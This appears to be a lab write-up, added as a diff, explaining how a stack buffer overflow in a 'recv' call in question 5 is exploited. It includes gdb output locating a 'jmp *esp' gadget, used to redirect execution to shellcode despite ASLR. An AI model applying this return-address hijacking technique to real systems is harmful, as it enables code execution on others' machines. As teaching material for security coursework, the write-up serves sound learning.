@@ -1,0 +1,36 @@
+The vulnerability in question 5 is in the "recv" call inside the "io" function. Recv will read "n << 3" bytes into buf, whereas buf only has a size of n. Since n << 3 is n bit-shifted to the left by 3, it is potentially much larger than n. This causes a buffer overflow. Because q5 uses ASLR, there isn't a fixed buffer address where I can put my shell code for the overwritten return address to point to. Instead, I use gdb to find the address of 0xffe4 because that hex address translates to the jmp *esp instruction. Then, I fill buf with meaningless bytes, place my shell code at esp and overwrite the return address to the address of 0xffe4. 
+
+GDB output for finding 0xffe4:
+(gdb) disass magic
+Dump of assembler code for function magic:
+   0x08048604 <+0>:    push   %ebp
+   0x08048605 <+1>:    mov    %esp,%ebp
+   0x08048607 <+3>:    mov    0xc(%ebp),%eax
+   0x0804860a <+6>:    shl    $0x3,%eax
+   0x0804860d <+9>:    xor    %eax,0x8(%ebp)
+   0x08048610 <+12>:   mov    0x8(%ebp),%eax
+   0x08048613 <+15>:   shl    $0x3,%eax
+   0x08048616 <+18>:   xor    %eax,0xc(%ebp)
+   0x08048619 <+21>:   orl    $0xe4ff,0x8(%ebp)
+   0x08048620 <+28>:   mov    0xc(%ebp),%ecx
+   0x08048623 <+31>:   mov    $0x3e0f83e1,%edx
+   0x08048628 <+36>:   mov    %ecx,%eax
+   0x0804862a <+38>:   mul    %edx
+   0x0804862c <+40>:   mov    %edx,%eax
+   0x0804862e <+42>:   shr    $0x4,%eax
+   0x08048631 <+45>:   add    %eax,%eax
+   0x08048633 <+47>:   mov    %eax,%edx
+   0x08048635 <+49>:   shl    $0x5,%edx
+   0x08048638 <+52>:   add    %edx,%eax
+   0x0804863a <+54>:   mov    %ecx,%edx
+   0x0804863c <+56>:   sub    %eax,%edx
+   0x0804863e <+58>:   mov    %edx,%eax
+   0x08048640 <+60>:   mov    %eax,0xc(%ebp)
+   0x08048643 <+63>:   mov    0xc(%ebp),%eax
+   0x08048646 <+66>:   mov    0x8(%ebp),%edx
+   0x08048649 <+69>:   and    %edx,%eax
+   0x0804864b <+71>:   pop    %ebp
+   0x0804864c <+72>:   ret    
+End of assembler dump.
+(gdb) x/i 0x0804861c
+   0x804861c <magic+24>:	jmp    *%esp
